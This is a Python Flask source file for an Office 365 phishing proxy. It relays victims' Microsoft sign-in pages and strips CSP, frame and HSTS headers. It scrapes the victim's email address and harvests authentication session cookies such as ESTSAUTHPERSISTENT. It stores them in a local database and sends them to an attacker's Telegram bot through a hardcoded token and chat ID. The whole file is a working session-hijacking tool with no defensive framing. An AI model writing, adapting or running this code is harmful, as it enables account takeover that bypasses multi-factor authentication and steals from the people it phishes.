import os
import re
import json
import time
import sqlite3
import requests
from flask import Flask, request, Response

UPSTREAM = "https://login.microsoftonline.com"
TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT = "8877118461"
DB_PATH = "/tmp/cookies.db"

COOKIES_OF_INTEREST = [
    "ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT",
    "SignInStateCookie", "ESTSAUTHV3", "x-ms-gateway-slice"
]

app = Flask(__name__)

# ---------- DB ----------
def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        cookies TEXT,
        ts TEXT
    )""")
    con.commit()
    con.close()

init_db()

def save_cookies(email, cookie_str):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO cookies (email, cookies, ts) VALUES (?,?,?)",
                (email, cookie_str, time.strftime("%Y-%m-%d %H:%M:%S")))
    con.commit()
    con.close()

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT, "text": text},
            timeout=10
        )
    except Exception as e:
        print("Telegram error:", e)

# ---------- Proxy ----------
def proxy(path):
    url = UPSTREAM + path
    headers = {}
    for h in ["User-Agent", "Accept", "Accept-Language", "Content-Type", "Referer"]:
        if h in request.headers:
            headers[h] = request.headers[h]

    resp = requests.request(
        request.method, url,
        headers=headers,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False,
        timeout=30
    )

    out_headers = []
    for k, v in resp.headers.items():
        if k.lower() in ("content-encoding", "transfer-encoding", "content-length",
                         "strict-transport-security", "content-security-policy",
                         "x-frame-options"):
            continue
        if k.lower() == "location":
            v = v.replace(UPSTREAM, "")
        out_headers.append((k, v))

    body = resp.content

    # Try to grab victim email from the page
    email = None
    m = re.search(rb"([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)", body)
    if m:
        email = m.group(1).decode(errors="ignore")

    # Harvest cookies of interest from Set-Cookie
    if resp.cookies:
        caught = {}
        for name in COOKIES_OF_INTEREST:
            if name in resp.cookies:
                caught[name] = resp.cookies[name]
        if caught:
            cookie_str = json.dumps(caught)
            save_cookies(email or "unknown", cookie_str)
            send_telegram(
                f"\U0001F511 Cookies caught!\nEmail: {email or 'unknown'}\n{cookie_str}"
            )

    # Build response with preserved headers
    out_resp = Response(body, status=resp.status_code)
    for k, v in out_headers:
        out_resp.headers[k] = v
    return out_resp

# ---------- Routes ----------
@app.route("/", methods=["GET", "POST"])
def home():
    # Kick off the real Office 365 sign-in flow through the proxy
    path = ("/common/oauth2/v2.0/authorize"
            "?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "&response_type=code"
            "&redirect_uri=https%3A%2F%2Foutlook.office.com"
            "&scope=openid+offline_access"
            "&prompt=login")
    return proxy(path)

@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all(path):
    return proxy("/" + path)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
